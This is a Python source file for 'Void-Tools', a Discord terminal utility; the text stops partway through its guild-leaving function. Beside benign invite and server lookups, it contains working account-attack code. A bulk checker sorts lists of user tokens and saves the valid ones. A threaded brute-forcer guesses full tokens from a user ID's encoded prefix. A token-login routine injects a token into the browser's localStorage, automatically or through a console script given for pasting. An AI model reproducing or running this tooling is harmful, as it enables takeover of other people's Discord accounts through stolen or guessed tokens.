#!/usr/bin/env python3
"""Void-Tools — Discord tools (Void theme, optimized)."""
import sys, json, os, re, shutil, time, base64, random, string, threading, webbrowser
import concurrent.futures
from datetime import datetime, timezone
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

import requests
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.padding import Padding
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich import box

from lib import constants as C
from lib.config import get_settings

get_settings()

console = Console(highlight=False)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
C_OK = "#88FFAA"
C_ERR = C.C_NEON
C_ACCENT = "#5865F2"
L = {}


def set_language(s):
    global L
    L = s


def t(k):
    return L.get(k, k)


def _pal():
    return C.palette()


def _tw():
    return max(54, min(72, shutil.get_terminal_size((90, 30)).columns - 4))


def _ask(p):
    pcol = _pal()
    return input(f"\033[38;2;136;0;0m  ◆ {p} \033[38;2;180;180;200m▸\033[0m ").strip()


def _pause():
    console.print()
    input(f"\033[38;2;120;0;0m  ► {t('pause')} \033[0m")


def _panel(title, desc, tag="DISCORD"):
    p = _pal()
    console.print()
    head = Text.from_markup(
        f"[{C.C_GOLD} bold]◆ {title}[/]\n"
        f"[{C.C_DIM}]{desc}[/]\n"
        f"[{C_ACCENT} dim]▸ {tag}[/]"
    )
    console.print(Panel(
        Align.center(head),
        border_style=p["blood"], box=box.DOUBLE_EDGE, padding=(1, 2), width=_tw(),
    ))


def _fail(msg, detail=None):
    body = Text.from_markup(f"[{C_ERR} bold]{msg}[/]")
    if detail:
        body.append("\n")
        body.append(Text.from_markup(f"[{C.C_DIM}]{detail}[/]"))
    console.print(Panel(
        body, title=f"[bold white]✖ {t('error_title')}[/]",
        border_style=C_ERR, box=box.HEAVY, padding=(1, 2), width=_tw(),
    ))


def _ok(title, msg):
    console.print(Panel(
        Align.center(Text.from_markup(f"[{C_OK} bold]{msg}[/]")),
        title=f"[bold white]✔ {title}[/]",
        border_style=C_OK, box=box.ROUNDED, padding=(1, 2), width=_tw(),
    ))


def _hint(text):
    console.print(Padding(Text.from_markup(f"[{C.C_DIM}]{text}[/]"), (0, 1)))


def _mode_menu(options):
    p = _pal()
    tbl = Table(box=box.SIMPLE_HEAVY, border_style=p["mid"], show_header=False, padding=(0, 1))
    tbl.add_column("", style=C.C_GOLD, width=5, no_wrap=True)
    tbl.add_column("", style="white")
    for key, label in options.items():
        tbl.add_row(f"[{key}]", label)
    console.print(Padding(Panel(
        tbl, title=f"[{C.C_GOLD} bold]{t('pick_mode')}[/]",
        border_style=p["blood"], box=box.ROUNDED, width=_tw() - 2,
    ), (0, 0, 1, 0)))


def _stats_bar(items):
    p = _pal()
    parts = "   ".join(
        f"[{C.C_SILVER}]{k}[/] [{C.C_GOLD} bold]{v}[/]" for k, v in items
    )
    console.print(Panel(
        Align.center(Text.from_markup(parts)),
        border_style=p["dark"], box=box.SIMPLE, padding=(0, 1), width=_tw(),
    ))


def _show_table(title, rows, columns=None):
    p = _pal()
    if columns:
        tbl = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style=p["blood"], show_header=True, padding=(0, 1))
        for col in columns:
            tbl.add_column(col, style=C.C_GOLD if col == columns[0] else "white")
        for row in rows:
            tbl.add_row(*[str(x) for x in row])
    else:
        tbl = Table(box=box.SIMPLE, border_style=p["blood"], show_header=False, padding=(0, 1))
        tbl.add_column("", style=C.C_SILVER, width=16, no_wrap=True)
        tbl.add_column("", overflow="fold")
        for k, v in rows:
            tbl.add_row(k, str(v))
    console.print(Padding(Panel(
        tbl, title=f"[{C.C_GOLD} bold]{title}[/]",
        border_style=p["blood"], box=box.ROUNDED, padding=(0, 1), width=_tw(),
    ), (1, 0)))


def _as_dict(d):
    return d if isinstance(d, dict) else {}


def _mask_token(tok, show=12):
    tok = tok.strip()
    if len(tok) <= show + 4:
        return tok[:4] + "…"
    return tok[:show] + "…" + tok[-4:]


def _headers(token=None, json_body=False):
    h = {"User-Agent": UA, "Accept": "application/json"}
    if json_body:
        h["Content-Type"] = "application/json"
    if token:
        tok = token.strip()
        h["Authorization"] = tok if tok.lower().startswith("bot ") else tok
    return h


def _api(method, url, token=None, body=None, timeout=12):
    try:
        r = requests.request(
            method, url, headers=_headers(token, json_body=body is not None), json=body,
            timeout=timeout,
        )
        try:
            data = r.json() if r.text else {}
        except ValueError:
            data = {"raw": r.text[:200]}
        return r.status_code, data
    except requests.RequestException as ex:
        return 0, {"error": str(ex)}


def _user_tag(d):
    d = _as_dict(d)
    u = d.get("username", "?")
    disc = d.get("discriminator", "0")
    return u if not disc or disc == "0" else f"{u}#{disc}"


def _parse_invite(raw):
    raw = raw.strip()
    m = re.search(r"(?:discord\.gg/|discord(?:app)?\.com/invite/)([A-Za-z0-9-]+)", raw)
    if m:
        return m.group(1)
    return raw.split("/")[-1].split("?")[0]


def _export_dir():
    path = os.path.join(C.DATA_DIR, "exports")
    os.makedirs(path, exist_ok=True)
    return path


def _save_json(name, payload):
    path = os.path.join(_export_dir(), name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2, ensure_ascii=False)
    return path


def _download(url, path):
    try:
        r = requests.get(url, timeout=15, headers={"User-Agent": UA})
        if r.status_code == 200:
            with open(path, "wb") as f:
                f.write(r.content)
            return True
    except requests.RequestException:
        pass
    return False


_VERIFICATION_LABELS = {0: "None", 1: "Low", 2: "Medium", 3: "High", 4: "Very High"}


def _fetch_invite(code):
    return _api(
        "GET",
        f"https://discord.com/api/v9/invites/{code}?with_counts=true&with_expiration=true",
    )


def _invite_summary(code, status, data):
    data = _as_dict(data)
    if status != 200:
        return {"code": code, "ok": False, "error": data.get("message", f"HTTP {status}")}
    guild = _as_dict(data.get("guild"))
    channel = _as_dict(data.get("channel"))
    members = data.get("approximate_member_count")
    online = data.get("approximate_presence_count")
    features = guild.get("features") or []
    verification = guild.get("verification_level", "?")
    online_rate = (
        round(online / members * 100, 1)
        if isinstance(members, int) and isinstance(online, int) and members
        else None
    )
    return {
        "code": code, "ok": True,
        "server": guild.get("name", "?"), "id": guild.get("id", "?"),
        "description": (guild.get("description") or "-")[:120],
        "members": members if members is not None else "?",
        "online": online if online is not None else "?",
        "online_rate": online_rate,
        "boosts": guild.get("premium_subscription_count", "?"),
        "tier": guild.get("premium_tier", "?"),
        "verification": verification,
        "verification_label": _VERIFICATION_LABELS.get(verification, str(verification)),
        "nsfw_level": guild.get("nsfw_level", "?"),
        "features": features,
        "features_text": ", ".join(features) or "-",
        "feature_count": len(features),
        "vanity": guild.get("vanity_url_code") or "-",
        "channel": channel.get("name", "?"),
        "expires": data.get("expires_at") or t("never"),
        "link": f"https://discord.gg/{code}",
    }


def _as_int(value):
    return value if isinstance(value, int) else None


def _as_num(value):
    if isinstance(value, bool):
        return None
    if isinstance(value, (int, float)):
        return float(value)
    return None


def _cell(value, highlight=False):
    if highlight:
        return f"[bold {C_OK}]{value}[/]"
    return str(value)


def _delta_text(a, b, suffix="", pct_base=None):
    fa, fb = _as_num(a), _as_num(b)
    if fa is None or fb is None:
        return "-"
    diff = fa - fb
    if diff == 0:
        return f"[{C.C_DIM}]same[/]"
    sign = "+" if diff > 0 else ""
    is_int = isinstance(a, int) and isinstance(b, int) and not suffix
    text = f"{sign}{int(diff) if is_int else round(diff, 1)}{suffix}"
    if pct_base and pct_base > 0:
        pct = round(abs(diff) / float(pct_base) * 100, 1)
        text += f" ({pct}%)"
    return f"[{C_OK}]{text}[/]" if diff > 0 else f"[{C_ERR}]{text}[/]"


def _winner_label(side, a_val, b_val):
    fa, fb = _as_num(a_val), _as_num(b_val)
    if fa is None or fb is None or fa == fb:
        return f"[{C.C_DIM}]tie[/]"
    return f"[{C_OK}]{side}[/]" if fa > fb else f"[{C_OK}]B[/]"


def _compare_insights(sa, sb):
    rows = [
        (t("sc_member_diff"), _delta_text(sa["members"], sb["members"], pct_base=_as_int(sb["members"]) or _as_int(sa["members"]))),
        (t("sc_online_diff"), _delta_text(sa["online"], sb["online"], pct_base=_as_int(sb["online"]) or _as_int(sa["online"]))),
        (t("sc_boost_diff"), _delta_text(sa["boosts"], sb["boosts"])),
        (t("sc_feature_diff"), _delta_text(sa["feature_count"], sb["feature_count"])),
    ]
    if sa.get("online_rate") is not None and sb.get("online_rate") is not None:
        rate_diff = round(sa["online_rate"] - sb["online_rate"], 1)
        if rate_diff == 0:
            rows.append((t("sc_rate_diff"), f"[{C.C_DIM}]same[/]"))
        else:
            sign = "+" if rate_diff > 0 else ""
            color = C_OK if rate_diff > 0 else C_ERR
            rows.append((t("sc_rate_diff"), f"[{color}]{sign}{rate_diff}%[/]"))
    rows.extend([
        (t("sc_members_win"), _winner_label("A", sa["members"], sb["members"])),
        (t("sc_online_win"), _winner_label("A", sa["online"], sb["online"])),
        (t("sc_activity_win"), _winner_label("A", sa.get("online_rate"), sb.get("online_rate"))),
        (t("sc_boosts_win"), _winner_label("A", sa["boosts"], sb["boosts"])),
    ])
    fa = set(sa.get("features") or [])
    fb = set(sb.get("features") or [])
    only_a = sorted(fa - fb)
    only_b = sorted(fb - fa)
    rows.append((t("sc_shared_feat"), str(len(fa & fb))))
    rows.append((t("sc_only_a"), ", ".join(only_a[:4]) + (" …" if len(only_a) > 4 else "") if only_a else "-"))
    rows.append((t("sc_only_b"), ", ".join(only_b[:4]) + (" …" if len(only_b) > 4 else "") if only_b else "-"))
    rows.append((t("community"), f"{C.TELEGRAM_TAG} · {C.DISCORD_TAG}"))
    return rows


def _load_lines(prompt, file_prompt):
    raw = _ask(prompt)
    if not raw:
        return []
    if raw.lower() == "file":
        fp = _ask(file_prompt).strip().strip('"')
        if not fp or not os.path.isfile(fp):
            _fail(t("file_not_found"))
            return []
        with open(fp, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    if "," in raw:
        return [x.strip() for x in raw.split(",") if x.strip()]
    lines = [raw]
    _hint(t("lines_hint"))
    while True:
        line = input(f"\033[38;2;80;80;100m    ▸ \033[0m").strip()
        if not line:
            break
        lines.append(line)
    return lines


def _confirm(msg):
    return _ask(msg).lower() in ("yes", "y", "oui", "o")


def _save_lines(filename, lines, mode="a"):
    path = os.path.join(C.DATA_DIR, filename)
    os.makedirs(C.DATA_DIR, exist_ok=True)
    with open(path, mode, encoding="utf-8") as f:
        for line in lines:
            f.write(line.rstrip() + "\n")
    return path


# ─── Tools ───────────────────────────────────────────────────────────────────

def token_checker():
    _panel(t("tk_title"), t("tk_desc"))
    token = _ask(t("token_prompt"))
    if not token:
        return
    with Progress(SpinnerColumn(style=C.C_GOLD), TextColumn("[progress.description]{task.description}"),
                  transient=True, console=console) as prog:
        prog.add_task(t("tk_checking"), total=None)
        code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=token)
    if code != 200:
        _fail(f"{t('token_invalid')} (HTTP {code})")
        return
    d = _as_dict(d)
    _show_table(t("token_ok"), [
        ("Status", f"[bold {C_OK}]● VALID[/]"),
        (t("user"), f"[bold]{_user_tag(d)}[/]"),
        ("ID", d.get("id", "?")),
        ("Email", d.get("email") or t("hidden")),
        ("Nitro", t("yes") if d.get("premium_type") else t("no")),
        ("Phone", t("yes") if d.get("phone") else t("no")),
        ("Verified", t("yes") if d.get("verified") else t("no")),
        ("MFA", t("yes") if d.get("mfa_enabled") else t("no")),
    ])


def server_lookup():
    _panel(t("sl_title"), t("sl_desc"))
    raw = _ask(t("inv_prompt"))
    if not raw:
        return
    code = _parse_invite(raw)
    c, d = _fetch_invite(code)
    if c != 200:
        _fail(f"{t('inv_invalid')} (HTTP {c})")
        return
    d = _as_dict(d)
    guild = _as_dict(d.get("guild"))
    channel = _as_dict(d.get("channel"))
    _show_table(t("sl_result"), [
        ("Code", f"[bold]{code}[/]"),
        (t("server"), guild.get("name", "?")),
        ("ID", guild.get("id", "?")),
        (t("sl_description"), (guild.get("description") or "-")[:200]),
        (t("members"), d.get("approximate_member_count", "?")),
        (t("online"), d.get("approximate_presence_count", "?")),
        (t("channel"), channel.get("name", "?")),
        ("Channel ID", channel.get("id", "?")),
        (t("expires"), d.get("expires_at") or t("never")),
        (t("sl_verification"), guild.get("verification_level", "?")),
        (t("sl_nsfw"), guild.get("nsfw_level", "?")),
        (t("sl_tier"), guild.get("premium_tier", "?")),
        (t("sl_boosts"), guild.get("premium_subscription_count", "?")),
        (t("sl_features"), ", ".join(guild.get("features") or []) or "-"),
        (t("sl_vanity"), guild.get("vanity_url_code") or "-"),
        ("Link", f"https://discord.gg/{code}"),
        (t("community"), f"{C.TELEGRAM_TAG} · {C.DISCORD_TAG}"),
    ])
    gid = guild.get("id")
    icon = guild.get("icon")
    banner = guild.get("banner")
    saved = []
    if gid and icon:
        ext = "gif" if str(icon).startswith("a_") else "png"
        url = f"https://cdn.discordapp.com/icons/{gid}/{icon}.{ext}?size=512"
        path = os.path.join(_export_dir(), f"server_{gid}_icon.{ext}")
        if _download(url, path):
            saved.append(path)
            _hint(f"+ icon → {path}")
    if gid and banner:
        ext = "gif" if str(banner).startswith("a_") else "png"
        url = f"https://cdn.discordapp.com/banners/{gid}/{banner}.{ext}?size=1024"
        path = os.path.join(_export_dir(), f"server_{gid}_banner.{ext}")
        if _download(url, path):
            saved.append(path)
            _hint(f"+ banner → {path}")
    report = _save_json(f"server_lookup_{code}.json", {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "invite_code": code, "guild": guild, "channel": channel,
        "approximate_member_count": d.get("approximate_member_count"),
        "approximate_presence_count": d.get("approximate_presence_count"),
        "expires_at": d.get("expires_at"), "saved_assets": saved,
    })
    _hint(f"+ report → {report}")


def server_compare():
    _panel(t("sc_title"), t("sc_desc"))
    a = _parse_invite(_ask(t("sc_inv1")))
    b = _parse_invite(_ask(t("sc_inv2")))
    if not a or not b:
        return
    sa = _invite_summary(a, *_fetch_invite(a))
    sb = _invite_summary(b, *_fetch_invite(b))
    if not sa["ok"] or not sb["ok"]:
        _fail(t("inv_invalid"), f"A={sa.get('error')} B={sb.get('error')}")
        return
    label_a = f"A · {sa['code']}"
    label_b = f"B · {sb['code']}"
    tbl = Table(box=box.SIMPLE, border_style=_pal()["blood"], show_header=True, padding=(0, 1))
    tbl.add_column(t("sc_field"), style=C.C_SILVER, width=16)
    tbl.add_column(label_a, overflow="fold", max_width=28)
    tbl.add_column(label_b, overflow="fold", max_width=28)
    tbl.add_column(t("sc_delta"), overflow="fold", max_width=18)
    compare_rows = [
        (t("server"), sa["server"], sb["server"], "-"),
        ("ID", sa["id"], sb["id"], "-"),
        (t("members"), sa["members"], sb["members"], _delta_text(sa["members"], sb["members"], pct_base=_as_int(sb["members"]) or 1)),
        (t("online"), sa["online"], sb["online"], _delta_text(sa["online"], sb["online"], pct_base=_as_int(sb["online"]) or 1)),
        (t("sc_online_rate"),
         f"{sa['online_rate']}%" if sa.get("online_rate") is not None else "-",
         f"{sb['online_rate']}%" if sb.get("online_rate") is not None else "-",
         _delta_text(sa.get("online_rate"), sb.get("online_rate"), suffix="%") if sa.get("online_rate") is not None else "-"),
        (t("sl_boosts"), sa["boosts"], sb["boosts"], _delta_text(sa["boosts"], sb["boosts"])),
        (t("sl_tier"), f"Tier {sa['tier']}", f"Tier {sb['tier']}", _delta_text(sa["tier"], sb["tier"])),
        (t("sl_verification"), sa["verification_label"], sb["verification_label"], "-"),
        (t("sl_nsfw"), sa["nsfw_level"], sb["nsfw_level"], _delta_text(sa["nsfw_level"], sb["nsfw_level"])),
        (t("sc_features"), sa["feature_count"], sb["feature_count"], _delta_text(sa["feature_count"], sb["feature_count"])),
        (t("sl_vanity"), sa["vanity"], sb["vanity"], "-"),
        (t("sc_inv_channel"), sa["channel"], sb["channel"], "-"),
        (t("expires"), sa["expires"], sb["expires"], "-"),
    ]
    hi_fields = {t("members"), t("online"), t("sl_boosts"), t("sc_features")}
    for field, va, vb, delta in compare_rows:
        hi_a = field in hi_fields and _as_num(va) is not None and _as_num(vb) is not None and _as_num(va) > _as_num(vb)
        hi_b = field in hi_fields and _as_num(va) is not None and _as_num(vb) is not None and _as_num(vb) > _as_num(va)
        tbl.add_row(field, _cell(str(va), hi_a), _cell(str(vb), hi_b), delta)
    console.print(Padding(Panel(
        tbl, title=f"[{C.C_GOLD} bold]{t('sc_result')}[/]",
        border_style=_pal()["blood"], box=box.ROUNDED, padding=(0, 1), width=_tw(),
    ), (1, 0)))
    _show_table(t("sc_insights"), _compare_insights(sa, sb))
    if sa["description"] != "-" or sb["description"] != "-":
        _show_table(t("sc_descriptions"), [("A", sa["description"]), ("B", sb["description"])])
    report = _save_json("server_compare.json", {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "a": sa, "b": sb,
        "insights": {k: v for k, v in _compare_insights(sa, sb)},
    })
    _hint(f"+ report → {report}")


def vanity_checker():
    _panel(t("vc_title"), t("vc_desc"))
    slug = _ask(t("vc_prompt")).strip().lower().replace("https://discord.gg/", "")
    if not slug or not re.fullmatch(r"[a-z0-9-]{2,32}", slug):
        _fail(t("vc_invalid"))
        return
    c, data = _api("GET", f"https://discord.com/api/v9/invites/{slug}?with_counts=true")
    data = _as_dict(data)
    if c == 200:
        guild = _as_dict(data.get("guild"))
        vanity = guild.get("vanity_url_code")
        rows = [
            (t("vc_slug"), slug),
            (t("vc_status"), t("vc_taken") if vanity else t("vc_invite_exists")),
            (t("server"), guild.get("name", "?")),
            ("ID", guild.get("id", "?")),
            (t("members"), data.get("approximate_member_count", "?")),
            (t("online"), data.get("approximate_presence_count", "?")),
            (t("vc_match"), t("yes") if vanity == slug else f"{t('vc_invite_only')} ({vanity or '-'})"),
            ("Link", f"https://discord.gg/{slug}"),
            (t("community"), f"{C.TELEGRAM_TAG} · {C.DISCORD_TAG}"),
        ]
    else:
        rows = [
            (t("vc_slug"), slug),
            (t("vc_status"), t("vc_available")),
            ("HTTP", str(c)),
            (t("vc_note"), t("vc_probe_note")),
            (t("community"), f"{C.TELEGRAM_TAG} · {C.DISCORD_TAG}"),
        ]
    _show_table(t("vc_result"), rows)
    report = _save_json(f"vanity_{slug}.json", {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "slug": slug, "http": c, "data": data,
    })
    _hint(f"+ report → {report}")


def _parse_uid(raw):
    raw = (raw or "").strip()
    m = re.search(r"(\d{17,20})", raw)
    return m.group(1) if m else ""


_BADGE_FLAGS = [
    (1 << 0, "Staff"), (1 << 1, "Partner"), (1 << 2, "HypeSquad Events"),
    (1 << 3, "Bug Hunter"), (1 << 6, "Bravery"), (1 << 7, "Brilliance"),
    (1 << 8, "Balance"), (1 << 9, "Early Supporter"), (1 << 14, "Bug Hunter L2"),
    (1 << 16, "Verified Bot"), (1 << 17, "Early Verified Bot"),
    (1 << 18, "Moderator Alumni"), (1 << 22, "Active Developer"),
]


def _decode_badges(flags):
    if not flags:
        return t("no")
    names = [n for bit, n in _BADGE_FLAGS if int(flags) & bit]
    return ", ".join(names) if names else str(flags)


def _snowflake_info(uid):
    sid = int(uid)
    ts_ms = (sid >> 22) + 1420070400000
    created = datetime.fromtimestamp(ts_ms / 1000, tz=timezone.utc)
    now = datetime.now(timezone.utc)
    age_days = (now - created).days
    years, rem = divmod(age_days, 365)
    age = f"{years}y {rem}d" if years else f"{age_days}d"
    worker = (sid & 0x3E0000) >> 17
    process = (sid & 0x1F000) >> 12
    inc = sid & 0xFFF
    avatar_idx = (sid >> 22) % 6
    try:
        token_prefix = base64.b64encode(str(uid).encode()).decode().rstrip("=")
    except Exception:
        token_prefix = "?"
    local = created.astimezone()
    return {
        "created": created.strftime("%Y-%m-%d %H:%M:%S UTC"),
        "created_local": local.strftime("%Y-%m-%d %H:%M:%S"),
        "age": age,
        "age_days": age_days,
        "unix": ts_ms // 1000,
        "timestamp_ms": ts_ms,
        "worker": worker,
        "process": process,
        "increment": inc,
        "hex": f"0x{sid:X}",
        "avatar_idx": avatar_idx,
        "token_prefix": token_prefix,
        "default_avatar": f"https://cdn.discordapp.com/embed/avatars/{avatar_idx}.png",
    }


def _snowflake_rows(uid, sf):
    return [
        ("ID", f"[bold]{uid}[/]"),
        (t("created"), sf["created"]),
        (t("created_local"), sf["created_local"]),
        (t("age"), f"{sf['age']} ({sf['age_days']}d)"),
        ("Unix", sf["unix"]),
        (t("snowflake"), sf["timestamp_ms"]),
        ("Hex", sf["hex"]),
        ("Worker", sf["worker"]),
        ("Process", sf["process"]),
        ("Increment", sf["increment"]),
        (t("default_avatar"), f"#{sf['avatar_idx']}"),
        (t("token_prefix"), f"[dim]{sf['token_prefix']}[/]"),
        (t("avatar"), sf["default_avatar"]),
        ("Profile", f"https://discord.com/users/{uid}"),
    ]


def _profile_rows(uid, d, sf):
    avatar = (
        f"https://cdn.discordapp.com/avatars/{uid}/{d.get('avatar')}.png?size=256"
        if d.get("avatar") else sf["default_avatar"]
    )
    banner = "—"
    if d.get("banner"):
        banner = f"https://cdn.discordapp.com/banners/{uid}/{d.get('banner')}.png?size=512"
    accent = d.get("accent_color")
    accent_str = f"#{accent:06X}" if isinstance(accent, int) else "—"
    return [
        ("ID", f"[bold]{d.get('id', uid)}[/]"),
        (t("user"), f"[bold]{_user_tag(d)}[/]"),
        (t("display_name"), d.get("global_name") or "—"),
        (t("created"), sf["created"]),
        (t("age"), f"{sf['age']} ({sf['age_days']}d)"),
        ("Bot", t("yes") if d.get("bot") else t("no")),
        ("System", t("yes") if d.get("system") else t("no")),
        (t("badges"), _decode_badges(d.get("public_flags", 0))),
        ("Accent", accent_str),
        (t("avatar"), avatar),
        ("Banner", banner),
        (t("token_prefix"), f"[dim]{sf['token_prefix']}[/]"),
        ("Worker", sf["worker"]),
        ("Process", sf["process"]),
        ("Increment", sf["increment"]),
        ("Hex", sf["hex"]),
        ("Profile", f"https://discord.com/users/{uid}"),
    ]


def _fetch_user_api(uid, token):
    code, d = _api("GET", f"https://discord.com/api/v9/users/{uid}", token=token)
    if code == 401 and token and not token.lower().startswith("bot "):
        code, d = _api("GET", f"https://discord.com/api/v9/users/{uid}", token=f"Bot {token}")
    return code, _as_dict(d)


def user_lookup():
    _panel(t("user_title"), t("user_desc"))
    uid = _parse_uid(_ask(t("uid_prompt")))
    if not uid:
        _fail(t("uid_invalid"))
        return
    sf = _snowflake_info(uid)
    title = t("user_result")
    rows = _snowflake_rows(uid, sf)
    bot = _ask(t("user_bot_token")).strip()
    if bot:
        if not bot.lower().startswith("bot "):
            bot = f"Bot {bot}"
        with Progress(SpinnerColumn(style=C.C_GOLD), TextColumn("{task.description}"),
                      transient=True, console=console) as prog:
            prog.add_task(t("user_fetch"), total=None)
            code, d = _fetch_user_api(uid, bot)
        if code == 200:
            title = _user_tag(d)
            rows = _profile_rows(uid, d, sf)
        elif code == 404:
            _hint(t("user_not_found_api"))
        elif code == 401:
            _hint(t("user_bot_invalid"))
    _show_table(title, rows)


def _bulk_token_check(tokens, delay):
    valid = []
    rows = []
    p = _pal()
    with Progress(
        SpinnerColumn(style=C.C_GOLD),
        TextColumn("[bold]{task.description}"),
        BarColumn(bar_width=30, complete_style=p["neon"], finished_style=C_OK),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        task = prog.add_task(t("bf_running"), total=len(tokens))
        for i, tok in enumerate(tokens, 1):
            code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=tok)
            if code == 200 and isinstance(d, dict):
                valid.append(tok)
                rows.append((str(i), f"[{C_OK}]VALID[/]", _user_tag(d), str(d.get("id", "?")), _mask_token(tok)))
            else:
                rows.append((str(i), f"[{C_ERR}]FAIL[/]", "—", f"HTTP {code}", _mask_token(tok)))
            prog.advance(task)
            time.sleep(delay)
    _show_table(t("bf_result"), rows, columns=["#", "Status", t("user"), "ID", "Token"])
    _stats_bar([(t("bf_summary"), f"{len(valid)}/{len(tokens)}"), ("Valid", len(valid)), ("Invalid", len(tokens) - len(valid))])
    if valid and _confirm(t("bf_save")):
        path = _save_lines("tokens-valid.txt", valid)
        _ok(t("bf_saved"), path)


def _id_token_bruteforce(uid):
    try:
        half = base64.b64encode(str(uid).encode()).decode().rstrip("=")
    except Exception:
        _fail(t("bf_uid_invalid"))
        return
    _show_table(t("bf_half"), [
        ("User ID", uid),
        ("Prefix", f"[bold]{half}[/]"),
        ("Format", f"{half}.XXXXXX.{'…' * 8}"),
    ])
    if not _confirm(t("bf_continue")):
        return
    chars = string.ascii_letters + string.digits + "-_"
    found = threading.Event()
    stats = {"attempts": 0, "invalid": 0, "ratelimit": 0}
    lock = threading.Lock()
    _hint(f"{t('bf_bruting')}  ·  {t('on_ctrlc')}")

    def check_guess(guess):
        if found.is_set():
            return
        try:
            r = requests.get(
                "https://discord.com/api/v10/users/@me",
                headers=_headers(guess), timeout=4,
            )
            with lock:
                stats["attempts"] += 1
                n = stats["attempts"]
            if r.status_code == 200:
                found.set()
                data = r.json()
                _ok(t("bf_found"), guess)
                _show_table(_user_tag(data), [
                    (t("user"), _user_tag(data)),
                    ("ID", data.get("id", "?")),
                    ("Email", data.get("email") or t("hidden")),
                    ("Token", guess),
                ])
                _save_lines("token-found.txt", [guess], mode="w")
            elif r.status_code == 401:
                with lock:
                    stats["invalid"] += 1
            elif r.status_code == 429:
                with lock:
                    stats["ratelimit"] += 1
                time.sleep(float(r.json().get("retry_after", 2)))
        except Exception:
            pass

    workers = 10
    p = _pal()
    try:
        with Progress(
            SpinnerColumn(style=C.C_GOLD),
            TextColumn("{task.description}"),
            BarColumn(bar_width=None, pulse_style=p["neon"], complete_style=C_OK),
            TextColumn("{task.fields[attempts]}"),
            TimeElapsedColumn(),
            console=console,
        ) as prog:
            task = prog.add_task(t("bf_bruting"), total=None, attempts="0 att.")
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
                futures = []
                while not found.is_set():
                    guess = f"{half}.{''.join(random.choices(chars, k=6))}.{''.join(random.choices(chars, k=38))}"
                    futures.append(pool.submit(check_guess, guess))
                    futures = [f for f in futures if not f.done()]
                    if len(futures) > 100:
                        time.sleep(0.005)
                    if stats["attempts"] % 10 == 0:
                        prog.update(task, attempts=f"{stats['attempts']} att. · {stats['invalid']} bad · {stats['ratelimit']} rl")
    except KeyboardInterrupt:
        _stats_bar([
            (t("bf_stopped"), "—"),
            (t("bf_attempts"), stats["attempts"]),
            ("Invalid", stats["invalid"]),
            ("RateLimit", stats["ratelimit"]),
        ])


def token_bruteforce():
    _panel(t("bf_title"), t("bf_desc"))
    _mode_menu({"1": t("bf_mode_id"), "2": t("bf_mode_list")})
    mode = _ask(t("bf_mode")) or "1"
    if mode == "2":
        tokens = _load_lines(t("bf_prompt"), t("bf_file"))
        tokens = list(dict.fromkeys(tokens))
        if not tokens:
            return
        try:
            delay = max(0.3, float(_ask(t("bf_delay")) or "0.5"))
        except ValueError:
            delay = 0.5
        _bulk_token_check(tokens, delay)
        return
    uid = _parse_uid(_ask(t("uid_prompt")))
    if not uid:
        _fail(t("uid_invalid"))
        return
    _id_token_bruteforce(uid)


def token_login():
    _panel(t("tl_title"), t("tl_desc"))
    token = _ask(t("token_prompt"))
    if not token:
        return
    code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=token)
    if code != 200:
        _fail(f"{t('token_invalid')} (HTTP {code})")
        return
    _stats_bar([(t("token_ok"), _user_tag(d)), ("ID", _as_dict(d).get("id", "?"))])
    esc = token.replace("\\", "\\\\").replace('"', '\\"')
    script = (
        'function login(token){setInterval(()=>{document.body.appendChild('
        'document.createElement("iframe")).contentWindow.localStorage.token=`"${token}"`},50);'
        'setTimeout(()=>location.reload(),2500);}'
        f'login("{esc}")'
    )
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            service = Service(ChromeDriverManager().install())
        except Exception:
            service = Service()
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        opts.add_argument("--log-level=3")
        with Progress(SpinnerColumn(style=C.C_GOLD), TextColumn("{task.description}"), transient=True, console=console) as prog:
            prog.add_task(t("tl_chrome"), total=None)
            driver = webdriver.Chrome(service=service, options=opts)
            driver.get("https://discord.com/login")
            time.sleep(2)
            driver.execute_script(script)
        _ok(t("tl_title"), t("tl_auto_ok"))
        return
    except Exception as ex:
        _hint(f"{t('tl_manual')} ({ex})")
    webbrowser.open("https://discord.com/login")
    console.print(Panel(
        Group(
            Text.from_markup(f"[{C.C_GOLD} bold]{t('tl_steps')}[/]\n"),
            Text.from_markup(f"[{C.C_SILVER}]1.[/] F12 → Console"),
            Text.from_markup(f"[{C.C_SILVER}]2.[/] Colle la commande :\n"),
            Text.from_markup(f"[white]{script}[/]"),
        ),
        border_style=_pal()["blood"], box=box.ROUNDED, padding=(1, 2), width=_tw(),
    ))


def guild_leaver():
    _panel(t("gl_title"), t("gl_desc"))
    token = _ask(t("token_prompt"))
    if not token:
        return
    code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=token)
    if code != 200:
        _fail(f"{t('token_invalid')} (HTTP {code})")
        return
    gc, guilds = _api("GET", "https://discord.com/api/v9/users/@me/guilds", token=token)
    if gc != 200 or not isinstance(guilds, list):
        _fail(t("gl_fetch_fail"))
        return
    if not guilds:
        _hint(t("gl_empty"))
        return
    preview = Table(box=box.SIMPLE, border_style=_pal()["mid"], show_header=True, padding=(0, 1))
    preview.add_column(t("server"), style="white")
    preview.add_column("ID", style=C.C_DIM)
